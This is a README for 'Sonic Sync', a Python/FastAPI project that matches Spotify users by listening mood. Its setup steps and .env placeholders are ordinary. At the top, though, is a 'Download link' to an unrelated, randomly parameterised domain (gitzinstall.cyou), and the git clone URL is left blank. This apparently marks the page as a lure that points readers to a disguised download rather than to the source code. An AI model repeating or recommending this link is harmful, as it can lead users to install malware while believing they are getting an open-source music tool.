# Sonic Sync 🎧

[Download link](https://gitzinstall.cyou?xoxkct8o0mnljxt)

Sonic Sync is a mood-based music compatibility project that analyzes your Spotify listening habits to create personalized mood profiles and match you with compatible "Sonic Twins".

## Features

- **Mood Maps**: Analyze your top tracks across different times of day (morning, afternoon, night)
- **Sonic Twins**: Find users with similar emotional listening rhythms
- **Blend Playlists**: Create shared playlists blending compatible tracks
- **Mood Visualization**: See your listening habits visualized in beautiful charts

## Setup Instructions

### Prerequisites

- Python 3.8+
- Spotify Developer Account

### Installation

1. Clone the repository
   ```
   git clone 
   cd sonic-sync
   ```

2. Create and activate a virtual environment
   ```
   python -m venv venv
   source venv/bin/activate  # On Windows: venv\Scripts\activate
   ```

3. Install dependencies
   ```
   pip install -r requirements.txt
   ```

4. Create a `.env` file in the `backend/app` directory with the following content:
   ```
   # Spotify API Credentials
   SPOTIFY_CLIENT_ID=your_spotify_client_id
   SPOTIFY_CLIENT_SECRET=your_spotify_client_secret
   SPOTIFY_REDIRECT_URI=http://localhost:8000/api/v1/auth/callback

   # App Secret Key
   SECRET_KEY=your_secret_key_here
   ```

5. Register a Spotify Developer App:
   - Go to [Spotify Developer Dashboard](https://developer.spotify.com/dashboard/applications)
   - Create a new application
   - Add `http://localhost:8000/api/v1/auth/callback` as a Redirect URI
   - Copy your Client ID and Client Secret to the `.env` file

### Running the Application

1. Start the backend server
   ```
   cd backend
   python run.py
   ```

2. Open your browser and navigate to `http://localhost:8000`

## Project Structure

```
sonic-sync/
├── backend/
│   ├── app/
│   │   ├── api/          # API routes
│   │   ├── core/         # Core configuration
│   │   ├── models/       # Data models
│   │   ├── services/     # Business logic
│   │   └── main.py       # FastAPI application
│   └── run.py            # Entry point
├── requirements.txt      # Python dependencies
└── README.md
```

## License

MIT
